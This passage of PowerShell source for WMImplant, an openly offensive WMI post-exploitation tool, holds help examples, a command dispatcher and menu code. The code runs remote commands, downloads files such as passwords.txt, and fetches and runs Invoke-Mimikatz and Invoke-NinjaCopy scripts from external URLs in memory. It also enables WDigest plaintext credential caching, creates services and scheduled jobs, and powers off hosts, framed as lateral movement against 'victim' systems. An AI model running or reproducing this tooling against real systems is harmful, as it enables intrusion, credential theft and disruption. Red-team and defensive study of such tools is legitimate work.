    > Invoke-WMImplant -Command download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -Target mysystem
    This command attempts to download the file C:\passwords.txt on the remote system "mysystem" locally to C:\Users\Chris\Downloads\passwords.txt.  It authenticates to the remote machine (to download the file) using the current user's context, and then is downloaded localy.
    
    .EXAMPLE
    > Invoke-WMImplant -Command ls -RemoteFile C:\Users\Chris\Downloads -Target win7computer
    This command will get a directory list of all files within C:\Users\Chris\Downloads on the "win7computer" system under the current user's context.

    .EXAMPLE
    > Invoke-WMImplant -Command search -RemoteFile password.txt -Drive C: -Target chrispc -RemoteUser homedomain\Chris -RemotePass pass123
    This command searches the remote system "chrispc" for any file called password.txt on the C drive and authenticates using the credentials provided.

    .EXAMPLE
    > Invoke-WMImplant -Command search -RemoteExtension sql -Drive C: -Target computer2
    This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.

    .EXAMPLE
    > Invoke-WMImplant -Command remote_posh -Url http://192.168.23.13/test.ps1 -Function Invoke-Mimikatz -LocalUser test\chris -LocalPass password123 -Target win7sys -RemoteUser test\admin -Pass admin123
    This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
    
    .EXAMPLE
    > Invoke-WMImplant -Command ps -RemoteUser test\apple -RemotePass pass123 -Target hackerpc
    This command gets a process listing on the system "hackerpc" by authenticating as the apple user

    .EXAMPLE
    > Invoke-WMImplant -Command process_kill -ProcessID 1194 -Target sys3
    This command kills process id 1194 on the "sys3" system and authenticates with the current user's context

    .EXAMPLE
    > Invoke-WMImplant -Command process_kill -ProcessName systemexplorer.exe -Target win7 -RemoteUser internal\admin -RemotePass pass123
    This command kills the remote process "systemexplorer.exe" on the system "win7" and authenticates as the "admin" user.

    .EXAMPLE
    > Invoke-WMImplant -Command process_start -RemoteFile notepad.exe -Target victimsys
    This command authenticates to the "victimsys" system under the current user's context and starts the process notepad.exe

    .EXAMPLE
    > Invoke-WMImplant -Command process_start -RemoteFile C:\notabackdoor.exe -Target victim2 -RemoteUser inside\goodadmin -RemotePass pass222
    This command authenticates to the "victim2" system as the user "goodadmin" and runs the binary located at C:\notabackdoor.exe
    
    .EXAMPLE
    > Invoke-WMImplant -Command active_users -Target winadmin
    This command displays any user that has a process running on the "winadmin" system via the current user's context

    .EXAMPLE
    > Invoke-WMImplant -Command vacant_system -Target victim9 -RemoteUser owned\chris -RemotePass badpass
    This command attempts to determine if a user is active at the "victim9" system by searching for active screensavers and a logon prompt and authenticates as the user "chris"
    
    .EXAMPLE
    > Invoke-WMImplant -Command drive_list -Target victim101
    This command authenticates to the victim101 system in the context of the current user and lists all drives connected to the system

    .EXAMPLE
    > Invoke-WMImplant -Command reboot -Target victom3
    This command reboots the "victom3" system

    .EXAMPLE
    > Invoke-WMImplant -Command poweroff -Target victim9 -RemoteUser domain\user -RemotePass pass123
    This command powers off the "victim9" and authenticates as the provided user and password.

    .EXAMPLE
    > Invoke-WMImplant -Command sched_job -JobAction list -Target winsys2
    This command authenticates to the winsys2 system under the current user's context and list all scheduled jobs.

    .EXAMPLE
    > Invoke-WMImplant -Command sched_job -JobAction delete -RemoteID 15 -Target winsys3 -RemoteUser sys\tester -RemotePass chrispass
    This command authenticates to the winsys3 application with the tester account and deletes the schedule job with the job id of 15.

    .EXAMPLE
    > Invoke-WMImplant -Command sched_job -JobAction create -RemoteFile notepad.exe -Time 14:45 -Target theboss
    This command authenticates to "theboss" system under the current user's context, and creates a job that runs notepad.exe at 14:45.
    
    .EXAMPLE
    > Invoke-WMImplant -Command registry_mod -RegMethod create -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegValue ChrisTest -RegData "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
    This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM

    .EXAMPLE
    > Invoke-WMImplant -command registry_mod -RegMethod delete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegValue ChrisTest2 -Target Win7user4
    This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$Command,
        [Parameter(Mandatory = $False)]
        [string]$ListCommands,
        [Parameter(Mandatory = $False)]
        [string]$RemoteUser,
        [Parameter(Mandatory = $False)]
        [string]$RemotePass,
        [Parameter(Mandatory = $False)]
        [string]$RemoteID,
        [Parameter(Mandatory = $False)]
        [string]$LocalUser,
        [Parameter(Mandatory = $False)]
        [string]$LocalPass,
        [Parameter(Mandatory = $False)]
        [string]$LocalFile,
        [Parameter(Mandatory = $False)]
        [string]$RemoteFile,
        [Parameter(Mandatory = $False)]
        [string]$RemoteDrive,
        [Parameter(Mandatory = $False)]
        [string]$RemoteExtension,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$Url,
        [Parameter(Mandatory = $False)]
        [string]$Function,
        [Parameter(Mandatory = $False)]
        [string]$ProcessName,
        [Parameter(Mandatory = $False)]
        [string]$ProcessID,
        [Parameter(Mandatory = $False)]
        [string]$JobAction,
        [Parameter(Mandatory = $False)]
        [string]$ServiceName,
        [Parameter(Mandatory = $False)]
        [string]$ServiceAction,
        [Parameter(Mandatory = $False)]
        [string]$Time,
        [Parameter(Mandatory = $False)] 
        [string]$RegMethod,
        [Parameter(Mandatory = $False)] 
        [string]$RegHive,
        [Parameter(Mandatory = $False)] 
        [string]$RegKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegValue,
        [Parameter(Mandatory = $False)] 
        [string]$RegData,
        [Parameter(Mandatory = $False)] 
        [string]$RemoteCommand
    )

    Process
    {
        if($Command)
        {
            # Create the remote credential object that will be needed for EVERYTHING
            if($RemoteUser -and $RemotePass)
            {
                $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
                $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
            }

            switch ($Command.Trim().ToLower())
            {
                "cat"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "You need to specify a file to read with the RemoteFile flag!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
                        }

                        else
                        {
                            Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
                        }
                    }
                }

                "dg_download"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "You need to specify a file to read with the RemoteFile flag!"
                    }

                    if(!$LocalFile)
                    {
                        Throw "You need to specify the location to save the file with the $LocalFile flag!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-FileTransferWMImplantDG -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                        }

                        else
                        {
                            Invoke-FileTransferWMImplantDG -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                        }
                    }
                }

                "dg_upload"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$LocalUser -or !$LocalPass)
                    {
                        Throw "Please provide the LocalUser and LocalPass parameters to use for upload functionality!"
                    }

                    if(!$LocalFile)
                    {
                        Throw "Please use the LocalFile flag to specify the file to upload!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-FileTransferWMImplantDG -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
                        }

                        else
                        {
                            Invoke-FileTransferWMImplantDG -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
                        }
                    }
                }

                "download"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "You need to specify a file to read with the RemoteFile flag!"
                    }

                    if(!$LocalFile)
                    {
                        Throw "You need to specify the location to save the file with the $LocalFile flag!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                        }

                        else
                        {
                            Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                        }
                    }
                }

                "ls"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "Please provide the RemoteFile parameter to specify the directory to list!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteFile
                        }

                        else
                        {
                            Invoke-LSWMImplant -Target $Computer -Directory $RemoteFile
                        }
                    }
                }

                "ninjacopy"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "Please provide the RemoteFile parameter to specify the file to copy!"
                    }

                    if(!$LocalFile)
                    {
                        Throw "Please use the LocalFIle parameter to specify where to copy the file to!"
                    }

                    $FullCommand = '"Invoke-NinjaCopy -Path '
                    $FullCommand += "$RemoteFile "
                    $FullCommand += '-RemoteDestination '
                    $FullCommand += "$LocalFile"
                    $FullCommand +='"'

                    Foreach($Computer in $Target)
                    {
                        if ($RemoteCredential)
                        {
                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Computer
                        }

                        else
                        {
                            Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Computer
                        }
                    }
                }

                "search"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile -and !$RemoteExtension)
                    {
                        Throw "Please provide the RemoteFile or RemoteExtension parameter to specify the file or extension to search for!"
                    }

                    if(!$RemoteDrive)
                    {
                        Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            if($RemoteFile)
                            {
                                Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
                            }
                            elseif($RemoteExtension)
                            {
                                Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
                            }
                        }

                        else
                        {
                            if($RemoteFile)
                            {
                                Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
                            }
                            elseif($RemoteExtension)
                            {
                                Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
                            }
                        }
                    }
                }

                "upload"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$LocalUser -or !$LocalPass)
                    {
                        Throw "Please provide the LocalUser and LocalPass parameters to use for upload functionality!"
                    }

                    if(!$LocalFile)
                    {
                        Throw "Please use the LocalFile flag to specify the file to upload!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
                        }

                        else
                        {
                            Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
                        }
                    }
                }

                "command_exec"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteCommand)
                    {
                        Throw "You need to specify the command to run with the -Command!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
                        }

                        else
                        {
                            Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
                        }
                    }
                }

                "disable_wdigest"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Disable-WinRMWMI -Creds $Credential -Target $Computer
                        }

                        else
                        {
                            Disable-WinRMWMI -Target $Computer
                        }
                    }
                }

                "disable_winrm"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                        }

                        else
                        {
                            Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                        }
                    }
                }

                "enable_wdigest"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-RegValueMod -Creds $RemoteCredential -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
                        }

                        else
                        {
                            Invoke-RegValueMod -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
                        }
                    }
                }

                "enable_winrm"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                        }

                        else
                        {
                            Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                        }
                    }
                }

                "registry_mod"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RegMethod)
                    {
                        Throw "You need to specify if you want to [create] or [delete] a string registry value!"
                    }

                    if(!$RegHive)
                    {
                        Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
                    }

                    if(!$RegKey)
                    {
                        Throw "You need to specify the registry key you will add or remove a value from!"
                    }

                    if(!$RegValue)
                    {
                        Throw "Please provide the registry value you are looking to modify!"
                    }

                    switch($RegMethod)
                    {
                        "create"
                        {
                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
                                }
                                else
                                {
                                    Invoke-RegValueMod -Target $Computer -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
                                }
                            }
                        }

                        "delete"
                        {
                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
                                }
                                else
                                {
                                    Invoke-RegValueMod -Target $Computer -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
                                }
                            }
                        }
                    }
                }

                "remote_posh"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$Url)
                    {
                        Throw "You need to specify the URL flag to provide the location where!"
                    }

                    if(!$Function)
                    {
                        Throw "You need to specify the Function flag to provide the function to run on the remote system!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url $Url -Function $Function -Target $Computer
                        }

                        else
                        {
                            Invoke-RemoteScriptWithOutput -Url $Url -Function $Function -Target $Computer
                        }
                    }
                }

                "sched_job"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$JobAction)
                    {
                        Throw "You need to specify if you want to [list], [create], or [delete] a job with the -JobAction flag!"
                    }

                    switch ($JobAction.Trim().ToLower())
                    {
                        "list"
                        {
                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction list
                                }
                                else
                                {
                                    Invoke-JobMod -Target $Computer -JobAction list
                                }
                            }
                        }

                        "delete"
                        {
                            if(!$RemoteID)
                            {
                                Throw "You need to specify the job ID to delete with the -RemoteID flag"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction delete -JobId $RemoteID
                                }
                                else
                                {
                                    Invoke-JobMod -Target $Computer -JobAction delete -JobId $RemoteID
                                }
                            }
                        }

                        "create"
                        {
                            if(!$RemoteFile)
                            {
                                Throw "You need to specify the path to a file to run when creating a job with -RemoteFile flag"
                            }

                            if(!$Time)
                            {
                                Throw "You need to use -Time to specify when your job will run"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction create -JobProcess $RemoteFile -Time $Time
                                }
                                else
                                {
                                    Invoke-JobMod -Target $Computer -JobAction create -JobProcess $RemoteFile -Time $Time
                                }
                            }
                        }
                    }
                }

                "service_mod"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$ServiceAction)
                    {
                        Throw "You need to specify if you want to [start], [stop], [create], or [delete] a service with -ServiceAction!"
                    }

                    switch ($ServiceAction.Trim().ToLower())
                    {
                        "start"
                        {
                            if(!$ServiceName)
                            {
                                Throw "You need to specify the service name you want to start!"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
                                }
                                else
                                {
                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
                                }
                            }
                        }

                        "stop"
                        {
                            if(!$ServiceName)
                            {
                                Throw "You need to specify the service name you want to stop!"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
                                }
                                else
                                {
                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
                                }
                            }
                        }

                        "delete"
                        {
                            if(!$ServiceName)
                            {
                                Throw "You need to specify the service name you want to delete!"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
                                }
                                else
                                {
                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
                                }
                            }
                        }

                        "create"
                        {
                            if(!$ServiceName)
                            {
                                Throw "You need to specify the service name you want to create!"
                            }

                            if(!$RemoteFile)
                            {
                                Throw "You need to specify the path to the service binary for the service you are creating!"
                            }

                            Foreach($Computer in $Target)
                            {
                                if($RemoteCredential)
                                {
                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                                }
                                else
                                {
                                    Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                                }
                            }
                        }
                    }
                }

                "wdigest"
                {
                    if(!$Target)
                    {
                        Throw "You need to provide a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Computer
                        }

                        else
                        {
                            Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Computer
                        }
                }   }

                "ps"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Get-ProcessListingWMImplant -Target $Computer
                        }
                    }
                }

                "process_kill"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$ProcessName -and !$ProcessID)
                    {
                        Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
                    }

                    Foreach($Computer in $Target)
                    {

                        if($RemoteCredential)
                        {
                            if($ProcessName)
                            {
                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
                            }

                            elseif($ProcessID)
                            {
                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
                            }
                        }

                        else
                        {
                            if($ProcessName)
                            {
                                Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
                            }

                            elseif($ProcessID)
                            {
                                Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
                            }
                        }
                    }
                }

                "process_start"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    if(!$RemoteFile)
                    {
                        Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
                        }

                        else
                        {
                            Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
                        }
                    }
                }

                "active_users"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Find-CurrentUsers -Target $Computer
                        }
                    }
                }

                "basic_info"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-HostInfo -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Get-HostInfo -Target $Computer
                        }
                    }
                }

                "drive_list"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Get-ComputerDrives -Target $Computer
                        }
                    }
                }

                "ifconfig"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-NetworkCards -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Get-NetworkCards -Target $Computer
                        }
                    }
                }

                "installed_programs"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Get-InstalledPrograms -Target $Computer
                        }
                    }
                }

                "vacant_system"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Find-VacantComputer -Creds $RemoteCredential -Target $Computer
                        }

                        else
                        {
                            Find-VacantComputer -Target $Computer
                        }
                    }
                }

                "logon_events"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($LocalFile)
                        {
                            if($RemoteCredential)
                            {
                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
                            }

                            else
                            {
                                Get-WMIEventLogins -Target $Computer -FileName $LocalFile
                            }
                        }

                        else
                        {
                            if($RemoteCredential)
                            {
                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
                            }

                            else
                            {
                                Get-WMIEventLogins -Target $Computer
                            }
                        }
                    }
                }

                "logoff"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
                        }

                        else
                        {
                            Invoke-PowerOptionsWMI -Target $Computer -Logoff
                        }
                    }
                }

                "reboot"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
                        }

                        else
                        {
                            Find-VacantComputer -Target $Computer -Reboot
                        }
                    }
                }

                "power_off"
                {
                    if(!$Target)
                    {
                        Throw "You need to specify a target to run the command against!"
                    }

                    Foreach($Computer in $Target)
                    {
                        if($RemoteCredential)
                        {
                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
                        }

                        else
                        {
                            Find-VacantComputer -Target $Computer -Shutdown
                        }
                    }
                }

                default
                {
                    Write-Output "You did not provide a valid command!  Please try again!"
                }
            }  #End of command switch
        } # End of Command If

        elseif($ListCommands)
        {
            Show-WMImplantMainMenu
        }

        else
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }
    }
}

function Select-UserAccount
{
    # Query user for user account and password to use
    $UserUsername = Read-Host "Please provide the domain\username to use for authentication >"
    $UserPassword = Read-Host "Please provide the password to use for authentication >"

    # This block of code is executed when starting a process on a remote machine via wmi
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    return $cred
}

function Show-WMImplantMainMenu
{
    # Print out commands available to the user
    $menu_options = "`nWMImplant Main Menu:`n`n"

    $menu_options += "Meta Functions:`n"
    $menu_options += "====================================================================`n"
    $menu_options += "change_user - Change the user used to connect to remote systems`n"
    $menu_options += "exit - Exit WMImplant`n"
    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant.`n"
    $menu_options += "help - Display this help/command menu`n`n"

    $menu_options += "File Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "cat - Attempt to read a file's contents`n"
    $menu_options += "dg_download - Download a file from a device guard proteted system`n"
    $menu_options += "dg_upload - Upload a file to a device guard protected system`n"
    $menu_options += "download - Download a file from a remote machine`n"
    $menu_options += "ls - File/Directory listing of a specific directory`n"
    $menu_options += "ninjacopy - Copy any file`n"
    $menu_options += "search - Search for a file on a user-specified drive`n"
    $menu_options += "upload - Upload a file to a remote machine`n`n"

    $menu_options += "Lateral Movement Facilitation`n"
    $menu_options += "====================================================================`n"
    $menu_options += "command_exec - Run a command line command and get the output`n"
    $menu_options += "disable_wdigest - Remove registry value UseLogonCredential`n"
    $menu_options += "disable_winrm - Disable WinRM on the targeted host`n"
    $menu_options += "enable_wdigest - Add registry value UseLogonCredential`n"
    $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
    $menu_options += "registry_mod - Modify the registry on the targeted system`n"
    $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
    $menu_options += "sched_job - Manipulate scheduled jobs`n"
    $menu_options += "service_mod - Create, delete, or modify services`n"
    $menu_options += "wdigest - Alias for wdigest function of Mimikatz`n`n"

    $menu_options += "Process Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "process_kill - Kill a specific process`n"
    $menu_options += "process_start - Start a process on a remote machine`n"
    $menu_options += "ps - Process listing`n`n"
    
    $menu_options += "System Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "active_users - List domain users with active processes on a system`n"
    $menu_options += "basic_info - Gather hostname and other basic system info`n"
    $menu_options += "drive_list - List local and network drives`n"
    $menu_options += "ifconfig - IP information for NICs with IP addresses`n"
    $menu_options += "installed_programs - Receive a list of all programs installed`n"
    $menu_options += "logoff - Logs users off the specified system`n"
    $menu_options += "reboot - Reboot a system`n"
    $menu_options += "power_off - Power off a system`n"
    $menu_options += "vacant_system - Determine if a user is away from the system.`n`n"

    $menu_options += "Log Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "logon_events - Identify users that have logged into a system`n`n"

    # Print the menu out to the user
    $menu_options
}

function Use-MenuSelection
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $looping = $true
    while ($looping)
    {

        # Read in user's menu choice
        $menu_selection = Read-Host "Command >"
        $menu_selection = $menu_selection.Trim().ToLower()

        switch ($menu_selection)
        {
            "change_user"
            {
                $Credential = Select-UserAccount
            }

            "exit"
            {
                $looping = $false
            }

